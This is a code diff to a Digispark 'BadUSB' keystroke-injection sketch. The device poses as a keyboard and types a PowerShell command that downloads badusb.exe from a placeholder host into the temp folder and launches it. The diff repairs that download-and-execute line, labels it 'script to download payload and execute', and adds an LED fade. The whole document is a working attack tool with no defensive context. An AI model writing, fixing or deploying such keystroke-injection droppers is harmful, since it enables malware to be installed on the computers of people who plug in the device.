@@ -11,8 +11,9 @@ void loop() {
    DigiKeyBoard.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboard.delay(300);
    DigiKeyBoard.sendKeyStroke(KEY_ENTER);
-   DigiKeyBoard.println("wget \"example.com/badusb.exe\" -outfile \"$env:temp/badusb.exe\"; Start-Process \"$env:temp%/badusb.exe\"; exit;");
-   DigiKeyBoard.println(exit);
+   //script to download payload and execute
+   DigiKeyBoard.println("powershell -c 'wget \"http://example.com/badusb.exe\" -outfile \"$env:temp/badusb.exe\"; Start-Process \"$env:temp/badusb.exe\"'");
+   DigiKeyBoard.println("exit");
    blinkLED();
 }
 
@@ -20,6 +21,7 @@ void blinkLED(){
   byte brightness = 0;
   byte inc = 15; 
   while(1){
+    analogWrite(1, brightness);
     brightness += inc;
     if(brightness <= 0 || brightness >= 75)
       inc = -inc;
